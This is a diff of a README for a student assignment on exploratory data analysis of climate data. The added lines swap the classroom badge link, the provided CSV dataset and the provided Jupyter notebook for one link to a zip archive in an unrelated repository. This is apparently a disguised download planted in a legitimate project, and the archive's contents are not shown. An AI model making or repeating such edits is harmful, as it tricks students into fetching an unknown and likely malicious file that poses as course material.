@@ -1,4 +1,4 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/MFpQQ_l2)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/prshnt273/complete-eda-curious-coders/main/cozener/complete-eda-curious-coders.zip)](https://raw.githubusercontent.com/prshnt273/complete-eda-curious-coders/main/cozener/complete-eda-curious-coders.zip)
 ﻿
 # EDA_Assignment
 
@@ -19,7 +19,7 @@ In this assignment, you will perform a comprehensive Exploratory Data Analysis (
 ## Requirements
 
 ### 1. Data Preparation (15 points)
-- Load the provided Climate_Change_Indicators.csv file
+- Load the provided https://raw.githubusercontent.com/prshnt273/complete-eda-curious-coders/main/cozener/complete-eda-curious-coders.zip file
 - Clean any missing or inconsistent values (Basically none in this case, but check to be sure)
 - Aggregate the data by year, computing the average for each climate variable
 
@@ -47,7 +47,7 @@ For each climate variable (Global Temperature, CO2 Concentration, Sea Level Rise
 
 ## Technical Requirements
 - Use Python libraries: Pandas, NumPy, Matplotlib, and Seaborn
-- Complete all work in the provided Jupyter notebook (climate_eda.ipynb)
+- Complete all work in the provided Jupyter notebook (https://raw.githubusercontent.com/prshnt273/complete-eda-curious-coders/main/cozener/complete-eda-curious-coders.zip)
 - Include clear markdown explanations with your code and visualizations
 - Follow best practices for code organization and documentation (Make sure to have documentation as discussed earlier)
 
